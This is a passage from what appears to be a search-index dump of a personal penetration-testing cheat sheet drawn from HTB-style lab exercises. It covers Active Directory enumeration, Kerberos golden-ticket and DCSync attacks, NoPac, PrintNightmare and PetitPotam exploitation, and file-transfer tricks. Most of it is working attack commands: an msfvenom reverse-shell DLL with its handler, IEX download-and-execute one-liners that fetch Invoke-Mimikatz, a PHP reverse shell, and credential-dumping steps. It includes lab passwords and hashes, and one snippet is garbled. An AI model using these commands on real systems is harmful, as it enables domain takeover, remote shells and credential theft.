\"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -SearchScope Subtree -Filter *).count</code></li> </ol>"},{"location":"active-directory/ldap/#ldap-search-filters","title":"LDAP Search Filters","text":"<ol> <li>LDAP Query - Filter Disabled User Accounts: <code>Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name</code></li> <li>LDAP Query - Find All Groups: <code>Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' | select Name</code></li> <li>LDAP Query - Description Field: <code>Get-ADUser -Properties * -LDAPFilter '(&amp;(objectCategory=user)(description=*))' | select samaccountname,description</code></li> <li>LDAP Query - Find Trusted Users: <code>Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select Name,memberof, servicePrincipalName,TrustedForDelegation | fl</code></li> <li>LDAP Query - Find Trusted Computers: <code>Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl</code></li> <li>LDAP Query - Users With Blank Password: <code>Get-AdUser -LDAPFilter '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl</code></li> <li>LDAP Query - All Groups of User: <code>Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' |select Name</code></li> </ol>"},{"location":"active-directory/ldap/#enumerating-active-directory-with-built-in-tools","title":"Enumerating Active Directory with Built-in Tools","text":"<ol> <li>List users with admin's rights: <code>Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol | select Name,useraccountcontrol</code></li> <li>PowerView list users with admin's rights: <code>Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol</code></li> <li>List all users from OU with SAM and passwordneverxpired=yes: <code>dsquery user \"OU=Employees,DC=inlanefreight,DC=local\" -name * -scope subtree -limit 0 | dsget user -samid - pwdneverexpires | findstr /V no</code></li> <li>Get all groups with Get-Wmi: <code>Get-WmiObject -Class win32_group -Filter \"Domain='INLANEFREIGHT'\" | Select Caption,Name</code></li> <li>Get all objects <code>([adsisearcher]\"(&amp;(objectClass=Computer))\").FindAll() | select Path</code></li> </ol>"},{"location":"active-directory/ldap/#ldap-anonymous-bind","title":"LDAP Anonymous Bind","text":"<p>Use Python to quickly check if we can interact with LDAP without credentials:</p> <pre><code>from ldap3 import *\ns = Server('10.129.1.207',get_info = ALL)\nc =  Connection(s, '', '')\nc.bind()\ns.info\n</code></pre> <ol> <li>Using Ldapsearch: <code>ldapsearch -H ldap://10.129.1.207 -x -b \"dc=inlanefreight,dc=local\"</code></li> <li>Using Windapsearch: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u \"\" --functionality</code></li> <li>Pull a listing of all domain users to use in a password spraying attack: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u \"\" -U</code></li> <li>Obtain information about all domain computers: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u \"\" -C</code></li> <li>ldapsearch-ad.py s similar to windapsearch: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -t info</code></li> </ol>"},{"location":"active-directory/ldap/#credentialed-ldap-enumeration","title":"Credentialed LDAP Enumeration","text":"<ol> <li>Windapsearch: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u inlanefreight\\\\james.cross --da</code></li> <li>Some additional useful options, including pulling users and computers with unconstrained delegation: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -d inlanefreight.local -u inlanefreight\\\\james.cross --unconstrained-users</code></li> <li>Ldapsearch-ad - uickly obtain the password policy: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t pass-pols</code></li> <li>Ldapsearch-ad - look for users who may be subject to a Kerberoasting attack: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t kerberoast | grep servicePrincipalName:</code></li> <li>Ldapsearch-ad - retrieves users that can be ASREPRoasted: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t asreproast</code></li> </ol>"},{"location":"active-directory/lotl/","title":"Living Off the Land","text":""},{"location":"active-directory/lotl/#basic-enumeration-commands","title":"Basic Enumeration Commands","text":"<ol> <li>Prints the PC's Name: <code>hostname</code></li> <li>Prints out the OS version and revision level: <code>[System.Environment]::OSVersion.Version</code></li> <li>Prints the patches and hotfixes applied to the host: <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li> <li>Prints out network adapter state and configurations: <code>ipconfig /all</code></li> <li>Displays a list of environment variables for the current session (ran from CMD-prompt): <code>set</code></li> <li>Displays the domain name to which the host belongs (ran from CMD-prompt): <code>echo %USERDOMAIN%</code></li> <li>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt): <code>echo %logonserver%</code></li> <li>Systeminfo: <code>systeminfo</code></li> <li>Using qwinsta to list logged users: <code>qwinsta</code></li> </ol>"},{"location":"active-directory/lotl/#harnessing-powershell","title":"Harnessing PowerShell","text":"<ol> <li>Lists available modules loaded for use.: <code>Get-Module</code></li> <li>Will print the execution policy settings for each scope on a host.: <code>Get-ExecutionPolicy -List</code></li> <li>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.: <code>Set-ExecutionPolicy Bypass -Scope Process</code></li> <li>With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.: <code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code></li> <li>Return environment values such as key paths, users, computer information, etc.: <code>Get-ChildItem Env: | ft Key,Value</code></li> <li>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.: <code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"</code></li> <li>Downgrade Powershell: <code>powershell.exe -version 2</code></li> </ol>"},{"location":"active-directory/lotl/#checking-defenses","title":"Checking Defenses","text":"<ol> <li>Firewall Checks: <code>netsh advfirewall show allprofiles</code></li> <li>Windows Defender Check (from CMD.exe): <code>sc query windefend</code></li> <li>Get-MpComputerStatus: <code>Get-MpComputerStatus</code></li> </ol>"},{"location":"active-directory/lotl/#network-information","title":"Network Information","text":"<ol> <li>Lists all known hosts stored in the arp table.: <code>arp -a</code></li> <li>Prints out adapter settings for the host. We can figure out the network segment from here.: <code>ipconfig /all</code></li> <li>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.: <code>route print</code></li> <li>Displays the status of the host's firewall. We can determine if it is active and filtering traffic.: <code>netsh advfirewall show state</code></li> </ol>"},{"location":"active-directory/lotl/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<ol> <li>Prints the patch level and description of the Hotfixes applied: <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li> <li>Displays basic host information to include any attributes within the list: <code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></li> <li>A listing of all processes on host: <code>wmic process list /format:list</code></li> <li>Displays information about the Domain and Domain Controllers: <code>wmic ntdomain list /format:list</code></li> <li>Displays information about all local accounts and any domain accounts that have logged into the device: <code>wmic useraccount list /format:list</code></li> <li>Information about all local groups: <code>wmic group list /format:list</code></li> <li>Dumps information about any system accounts that are being used as service accounts.: <code>wmic sysaccount list /format:list</code></li> </ol>"},{"location":"active-directory/lotl/#net-commands","title":"Net Commands","text":"<ol> <li>Information about password requirements: <code>net accounts</code></li> <li>Password and lockout policy: <code>net accounts /domain</code></li> <li>Information about domain groups: <code>net group /domain</code></li> <li>List users with domain admin privileges: <code>net group \"Domain Admins\" /domain</code></li> <li>List of PCs connected to the domain: <code>net group \"domain computers\" /domain</code></li> <li>List PC accounts of domains controllers: <code>net group \"Domain Controllers\" /domain</code></li> <li>User that belongs to the group: <code>net group &lt;domain_group_name&gt; /domain</code></li> <li>List of domain groups: <code>net groups /domain</code></li> <li>All available groups: <code>net localgroup</code></li> <li>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default): <code>net localgroup administrators /domain</code></li> <li>Information about a group (admins): <code>net localgroup Administrators</code></li> <li>Add user to administrators: <code>net localgroup administrators [username] /add</code></li> <li>Check current shares: <code>net share</code></li> <li>Get information about a user within the domain: <code>net user &lt;ACCOUNT_NAME&gt; /domain</code></li> <li>List all users of the domain: <code>net user /domain</code></li> <li>Information about the current user: <code>net user %username%</code></li> <li>Mount the share locally: <code>net use x: \\computer\\share</code></li> <li>Get a list of computers: <code>net view</code></li> <li>Shares on the domains: <code>net view /all /domain[:domainname]</code></li> <li>List shares of a computer: <code>net view \\computer /ALL</code></li> <li>List of PCs of the domain: <code>net view /domain</code></li> </ol>"},{"location":"active-directory/lotl/#dsquery","title":"Dsquery","text":"<ol> <li>User Search: <code>dsquery user</code></li> <li>Computer Search: <code>dsquery computer</code></li> <li>Wildcard Search: <code>dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"</code></li> <li>Users With Specific Attributes Set (PASSWD_NOTREQD): <code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl</code></li> <li>Searching for Domain Controllers: <code>dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName</code></li> </ol>"},{"location":"active-directory/privilege/","title":"Privilege Escalation","text":""},{"location":"active-directory/privilege/#remote-desktop","title":"Remote Desktop","text":"<ol> <li>Enumerating the Remote Desktop Users Group: <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code></li> <li>Enumerating the Remote Management Users Group: <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code></li> <li>Establishing WinRM Session from Windows:<ol> <li><code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code></li> <li><code>$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)</code></li> <li><code>Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred</code></li> </ol> </li> <li>Connecting to a Target with Evil-WinRM and Valid Credentials: <code>evil-winrm -i 10.129.201.234 -u forend</code></li> </ol>"},{"location":"active-directory/privilege/#sql-server-admin","title":"SQL Server Admin","text":"<ol> <li>Enumerating MSSQL Instances with PowerUpSQL: <ol> <li><code>cd .\\PowerUpSQL\\</code></li> <li><code>Import-Module .\\PowerUpSQL.ps1</code></li> <li><code>Get-SQLInstanceDomain</code></li> </ol> </li> <li>Authenticate against the remote SQL server host and run custom queries or operating system commands: <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code></li> <li>Authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit: <code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></li> <li>Viewing our Options with Access to the SQL Server: <code>SQL&gt; help</code></li> <li>Choosing enable_xp_cmdshell: <code>SQL&gt; enable_xp_cmdshell</code></li> <li>Enumerating our Rights on the System using xp_cmdshell: <code>xp_cmdshell whoami /priv</code></li> </ol>"},{"location":"active-directory/trust/","title":"Attacking Domain Trust","text":""},{"location":"active-directory/trust/#enumerating-trust-relationships","title":"Enumerating Trust Relationships","text":"<ol> <li>Using Get-ADTrust: <code>Get-ADTrust -Filter *</code></li> <li>Checking for Existing Trusts using Get-DomainTrust: <code>Get-DomainTrust</code></li> <li>Using Get-DomainTrustMapping: <code>Get-DomainTrustMapping</code></li> <li>Checking Users in the Child Domain using Get-DomainUser: <code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></li> <li>Using netdom to query domain trust: <code>netdom query /domain:inlanefreight.local trust</code></li> <li>Using netdom to query domain controllers: <code>netdom query /domain:inlanefreight.local dc</code></li> <li>Using netdom to query workstations and servers: <code>netdom query /domain:inlanefreight.local workstation</code></li> </ol>"},{"location":"active-directory/trust/#extrasids-attack-mimikatz","title":"ExtraSids Attack - Mimikatz","text":"<ol> <li>Obtaining the KRBTGT Account's NT Hash using Mimikatz: <code>lsadump::dcsync /user:LOGISTICS\\krbtgt</code></li> <li>Using Get-DomainSID: <code>Get-DomainSID</code></li> <li>Obtaining Enterprise Admins Group's SID using Get-DomainGroup: <code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid</code></li> <li>Creating a Golden Ticket with Mimikatz: <code>kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></li> <li>Confirming a Kerberos Ticket is in Memory Using klist: <code>klist</code></li> <li>Listing the Entire C: Drive of the Domain Controller: <code>ls \\\\academy-ea-dc01.inlanefreight.local\\c$</code></li> </ol>"},{"location":"active-directory/trust/#extrasids-attack-rubeus","title":"ExtraSids Attack - Rubeus","text":"<ol> <li>Creating a Golden Ticket using Rubeus: <code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></li> <li><code>klist</code></li> <li>Performing a DCSync Attack: <ol> <li><code>.\\mimikatz.exe</code></li> <li><code>lsadump::dcsync /user:INLANEFREIGHT\\lab_adm</code></li> <li><code>lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL</code></li> </ol> </li> </ol>"},{"location":"active-directory/trust/#attacking-domain-trusts-child-parent-trusts-from-linux","title":"Attacking Domain Trusts - Child -&gt; Parent Trusts - from Linux","text":"<ol> <li>Performing DCSync with secretsdump.py: <code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></li> <li>Performing SID Brute Forcing using lookupsid.py: <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></li> <li>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\": <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"</code></li> <li>Constructing a Golden Ticket using ticketer.py: <code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></li> <li>Setting the KRB5CCNAME Environment Variable: <code>export KRB5CCNAME=hacker.ccache</code></li> <li>Getting a SYSTEM shell using Impacket's psexec.py: <code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></li> <li>Performing the Attack with raiseChild.py: <code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></li> </ol>"},{"location":"active-directory/trust/#attacking-domain-trusts-cross-forest-trust-abuse-from-windows","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows","text":"<ol> <li>Enumerating Accounts for Associated SPNs Using Get-DomainUser: <code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></li> <li>Enumerating the mssqlsvc Account: <code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof</code></li> <li>Performing a Kerberoasting Attacking with Rubeus Using /domain Flag: <code>.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></li> <li>Run the hash through Hashcat</li> </ol>"},{"location":"active-directory/trust/#admin-password-re-use-group-membership","title":"Admin Password Re-Use &amp; Group Membership","text":"<ol> <li>Using Get-DomainForeignGroupMember: <code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></li> <li>Convet SID to name: <code>Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500</code></li> <li>Accessing DC03 Using Enter-PSSession: <code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator</code></li> </ol>"},{"location":"active-directory/trust/#attacking-domain-trusts-cross-forest-trust-abuse-from-linux","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux","text":"<ol> <li>Using GetUserSPNs.py: <code>GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></li> <li>Using the -request Flag: <code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></li> </ol>"},{"location":"active-directory/trust/#hunting-foreign-group-membership-with-bloodhound-python","title":"**Hunting Foreign Group Membership with Bloodhound-python`","text":"<ol> <li>Running bloodhound-python Against INLANEFREIGHT.LOCAL: <code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></li> <li>Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf: <ol> <li><code>domain FREIGHTLOGISTICS.LOCAL</code></li> <li><code>nameserver 172.16.5.238</code></li> </ol> </li> <li>Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL: <code>bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2</code></li> </ol>"},{"location":"active-directory/vulns/","title":"Common Vulnerabilities","text":""},{"location":"active-directory/vulns/#nopac-samaccountname-spoofing","title":"NoPac (SamAccountName Spoofing)","text":"<ol> <li>Cloning the NoPac Exploit Repo: <code>git clone https://github.com/Ridter/noPac.git</code></li> <li>Check if the system is vulnerable using a scanner: <code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></li> <li>Running NoPac &amp; Getting a Shell: <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></li> <li>Using noPac to DCSync the Built-in Administrator Account: <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></li> </ol>"},{"location":"active-directory/vulns/#printnightmare","title":"PrintNightmare","text":"<ol> <li>Cloning the Exploit: <code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></li> <li>Install cube0x0's Version of Impacket:<ol> <li><code>pip3 uninstall impacket</code></li> <li><code>git clone https://github.com/cube0x0/impacket</code></li> <li><code>cd impacket</code></li> <li><code>python3 ./setup.py install</code></li> </ol> </li> <li>Enumerating for MS-RPRN: <code>rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'</code></li> <li>Generating a DLL Payload: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</code></li> <li>Creating a Share with smbserver.py: <code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></li> <li>Configuring &amp; Starting MSF multi/handler:<ol> <li><code>use exploit/multi/handler</code></li> <li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></li> <li><code>set LHOST 172.16.5.225</code></li> <li><code>set LPORT 8080</code></li> <li><code>run</code></li> </ol> </li> <li>Running the Exploit: <code>sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'</code></li> </ol>"},{"location":"active-directory/vulns/#petitpotam-ms-efsrpc","title":"PetitPotam (MS-EFSRPC)","text":"<ol> <li>Starting ntlmrelayx.py: <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></li> <li>Running PetitPotam.py: <code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></li> <li>Catching Base64 Encoded Certificate for DC01: <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></li> <li>Requesting a TGT Using gettgtpkinit.py: <code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache</code></li> <li>Setting the KRB5CCNAME Environment Variable: <code>export KRB5CCNAME=dc01.ccache</code></li> <li>Using Domain Controller TGT to DCSync: <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></li> <li>Confirming Admin Access to the Domain Controller: <code>crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf</code> Submitting a TGS Request for Ourselves Using getnthash.py is an alternate route once we have the TGT for our target (step 4)</li> <li>Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target.: <code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></li> <li>Using Domain Controller NTLM Hash to DCSync: <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code> Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.</li> <li>Requesting TGT and Performing PTT with DC01$ Machine Account: <code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt</code></li> <li>Confirming the Ticket is in Memory: <code>klist</code></li> <li>Performing DCSync with Mimikatz:<ol> <li><code>.\\mimikatz.exe</code></li> <li><code>mimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt</code></li> </ol> </li> </ol>"},{"location":"bash/bash_scripts/","title":"Bash","text":"<ol> <li>Find all IPs in file: <code>grep -oP '(\\d{1,3}\\.){3}\\d{1,3}' 80.txt &gt; ips.txt</code></li> <li>(Get-Content \"80.txt\")[0..10] | ForEach-Object { Start-Process \"http://$_\" }</li> <li>&lt;?php $ip = 'YOUR_IP';  // Replace with your IP $port = YOUR_PORT;  // Replace with your port $sock = fsockopen($ip, $port);  // Connect to your machine exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");  // Execute a shell ?&gt;</li> </ol>  $sock,  // Input     1 =&gt; $sock,  // Output     2 =&gt; $sock   // Error ], $pipes);  // Keep the socket open until the connection is closed proc_close($proc); ?&gt; <p>//simple php shell</p>"},{"location":"blue/phisihing/","title":"Phisihing","text":""},{"location":"blue/phisihing/#email-headers","title":"**Email headers","text":"<p>X-Originating-IP - The IP address of the email was sent from (this is known as an X-header) Smtp.mailfrom/header.from - The domain the email was sent from (these headers are within Authentication-Results) Reply-To - This is the email address a reply email will be sent to instead of the From email addres</p>"},{"location":"blue/phisihing/#characteristics-phishing-emails-have-in-common","title":"Characteristics phishing emails have in common:","text":"<ol> <li>The sender email name/address will masquerade as a trusted entity (email spoofing)</li> <li>The email subject line and/or body (text) is written with a sense of urgency or uses certain keywords such as Invoice, Suspended, etc. </li> <li>The email body (HTML) is designed to match a trusting entity (such as Amazon)</li> <li>The email body (HTML) is poorly formatted or written (contrary from the previous point)</li> <li>The email body uses generic content, such as Dear Sir/Madam. </li> <li>Hyperlinks (oftentimes uses URL shortening services to hide its true origin)</li> <li>A malicious attachment posing as a legitimate document</li> </ol>"},{"location":"enumeration/enumeration/","title":"Enumeration","text":""},{"location":"enumeration/enumeration/#host-discovery","title":"Host discovery","text":"<p>Powershell</p> <pre><code>1..254 | % { $ip=\"172.30.0.$_\"; if (ping -n 1 -w 100 $ip | Select-String \"TTL=\") { \"$ip is up\" } }\n</code></pre> <p>Bash</p> <pre><code>for ip in 172.30.0.{1..254}; do ping -c 1 -W 1 $ip &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"$ip is up\"; done\n</code></pre> <p>NC port scanner <code>nc -w 1 -v ip-address 1-100 2&gt;&amp;1 | grep -v refused</code></p>"},{"location":"enumeration/enumeration/#rustscan","title":"Rustscan","text":"<pre><code>sudo apt install cargo\ncargo install rustscan\nexport PATH=$PATH:/path/to/rustscan\nchmod +x /path/to/rustscan\necho 'export PATH=$PATH:/root/.cargo/bin' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nrustscan --version\nrustscan -a 172.20.0.52 -r 1-1000 //r - port range\nrustscan -a 172.20.0.52 -r 1-1000 -u -- -Pn //no ping\n\n</code></pre>"},{"location":"enumeration/nmap/","title":"Nmap","text":"<ol> <li>Host discovery: <code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5</code></li> <li>Scanning from IP list file: <code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5</code></li> <li>Scan Multiple IPs: <code>sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5</code></li> <li>Scan Single IP: <code>sudo nmap 10.129.2.18 -sn -oA host</code></li> <li>Discovering Open UDP Ports: <code>sudo nmap 10.129.2.28 -F -sU</code></li> <li>Banner Grabbing: <code>sudo nmap 10.129.2.28 -p- -sV</code></li> <li>Specifying Scripts: <code>sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands</code></li> <li>Vuln Category: <code>sudo nmap 10.129.2.28 -p 80 -sV --script vuln</code></li> <li>Optimized RTT: <code>sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</code></li> <li>Decoy: <code>sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</code></li> </ol>"},{"location":"file-transfer/filetransfer/","title":"Files Transfer","text":""},{"location":"file-transfer/filetransfer/#windows-file-transfer-methods","title":"Windows File Transfer Methods","text":""},{"location":"file-transfer/filetransfer/#powershell-based-decode-encode","title":"Powershell based decode/ encode","text":"<ol> <li>Convert to/from base64:<ol> <li>File to base64 on Linux: <code>cat file | base64 -w 0; echo</code></li> <li>Base64 to file on Windows: <code>[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CR(...)o=\"))</code></li> <li>Get md5 file hash on Windows: <code>Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5</code></li> <li>Get md5 file hash on Linux: <code>md5sum id_rsa</code></li> </ol> </li> <li>PowerShell DownloadFile Method<ol> <li><code>(New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</code></li> <li><code>(New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</code></li> </ol> </li> <li>PowerShell DownloadString - Fileless Method**<ol> <li><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></li> <li><code>(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX</code></li> </ol> </li> <li>PowerShell Invoke-WebRequest: <code>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</code></li> <li>Common Errors with PowerShell:<ol> <li>The parameter -UseBasicParsing: <code>Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX</code></li> <li>The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\" <code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code></li> </ol> </li> </ol>"},{"location":"file-transfer/filetransfer/#smb-downloads","title":"SMB Downloads","text":"<ol> <li>Create the SMB Server: <code>sudo impacket-smbserver share -smb2support /tmp/smbshare</code></li> <li>sudo impacket-smbserver share -smb2support /tmp/smbshare: <code>copy \\\\192.168.220.133\\share\\nc.exe</code></li> <li>Create the SMB Server with a Username and Password: <code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</code></li> <li>Mount the SMB Server with Username and Password: <code>net use n: \\\\192.168.220.133\\share /user:test test</code></li> </ol>"},{"location":"file-transfer/filetransfer/#ftp-downloads","title":"FTP Downloads","text":"<ol> <li><code>sudo pip3 